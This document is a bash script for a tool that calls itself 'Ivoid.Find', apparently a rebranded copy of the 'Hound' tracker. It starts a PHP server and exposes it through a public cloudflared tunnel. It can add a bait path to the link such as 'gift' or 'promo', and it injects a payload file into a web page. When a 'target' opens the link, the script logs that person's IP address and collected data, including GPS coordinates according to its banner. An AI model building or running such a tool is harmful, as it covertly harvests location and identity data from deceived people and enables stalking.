#!/bin/bash

trap 'printf "\n";stop' 2

banner() {
clear
printf '\n            ▄▄▄▄▄▄                          ▄▄▄▄▄▄                \n' 
printf '              █▀ ██                    █▄     ██             █▄ \n'
printf '                 ██              ▀▀    ██    ▄██▄▀▀ ▄        ██\n'
printf '                 ██ ▀█▄ ██▀▄███▄ ██ ▄████     ██ ██ ████▄ ▄████\n'
printf '                 ██  ██▄██ ██ ██ ██ ██ ██     ██ ██ ██ ██ ██ ██\n\n'
printf '\e[1;31m       ▄▄██▄▄ ▀█▀ ▄▀███▀▄██▄█▀███ ██ ▄██▄██▄██ ▀█▄█▀███\n'                                                                                
printf " \e[1;93m      Ivoid.Find - by Ivoid_Off [KrussiaDevSec]\e[0m \n"
printf " \e[1;92m      \"L'information veut être libre, nous sommes ses libérateurs\" \e[0m \n"
printf "\e[1;90m  is a simple and light tool for information gathering and capture GPS coordinates.\e[0m \n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || {
    echo >&2 "I require php but it's not installed. Aborting."
    exit 1
}
}

stop() {
pkill -f cloudflared > /dev/null 2>&1
pkill -f php > /dev/null 2>&1
pkill -f ssh > /dev/null 2>&1
exit 1
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
printf "\e[1;93m[+] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n\e[1;92m[*] Waiting targets, Press Ctrl + C to exit...\e[0m\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        printf "\n\e[1;92m[+] Target opened the link!\e[0m\n"
        catch_ip
        rm -f ip.txt
        tail -f -n 110 data.txt
    fi
    sleep 0.5
done
}

# >>> NOUVELLE OPTION : customisation du PATH <<<
customize_path() {
printf "\e[1;93m[*] Voulez-vous ajouter un chemin personnalisé à l'URL ? [Y/N]: \e[0m"
read path_choice

if [[ "$path_choice" =~ ^[Yy]$ ]]; then
    printf "\e[1;92m[+] Entrez le texte (ex: Discord, promo, gift): \e[0m"
    read custom_path
    custom_path=$(echo "$custom_path" | tr -cd 'a-zA-Z0-9_-')
else
    custom_path=""
fi
}

cf_server() {

if [[ ! -e cloudflared ]]; then
    command -v wget > /dev/null 2>&1 || {
        echo >&2 "I require wget but it's not installed. Aborting."
        exit 1
    }
    printf "\e[1;92m[+] Downloading Cloudflared...\e[0m\n"
    arch=$(uname -m)
    if [[ "$arch" == *'x86_64'* ]]; then
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
    elif [[ "$arch" == *'aarch64'* ]]; then
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
    else
        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared
    fi
    chmod +x cloudflared
fi

printf "\e[1;92m[+] Starting php server...\e[0m\n"
php -S 127.0.0.1:3333 index.php > /dev/null 2>&1 &
sleep 2

printf "\e[1;92m[+] Starting cloudflared tunnel...\e[0m\n"
rm -f cf.log
./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
sleep 10

base_link=$(grep -Eo 'https://[a-zA-Z0-9.-]+\.trycloudflare.com' cf.log | head -n1)

if [[ -z "$base_link" ]]; then
    printf "\e[1;31m[!] Direct link is not generating\e[0m\n"
    exit 1
fi

if [[ -n "$custom_path" ]]; then
    link="$base_link/$custom_path"
else
    link="$base_link"
fi

printf "\e[1;92m[*] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$link"

sed "s+forwarding_link+$link+g" template.php > index.php
checkfound
}

local_server() {
sed 's+forwarding_link++g' template.php > index.php
printf "\e[1;92m[+] Starting php server on Localhost:8080...\e[0m\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2
checkfound
}

hound() {
rm -f ip.txt
touch data.txt

sed -e '/tc_payload/r payload' index_chat.html > index.html

customize_path

default_option_server="Y"
read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n otherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
option_server="${option_server:-$default_option_server}"

if [[ "$option_server" =~ ^([Yy]|Yes|yes)$ ]]; then
    cf_server
else
    local_server
fi
}

banner
dependencies
hound
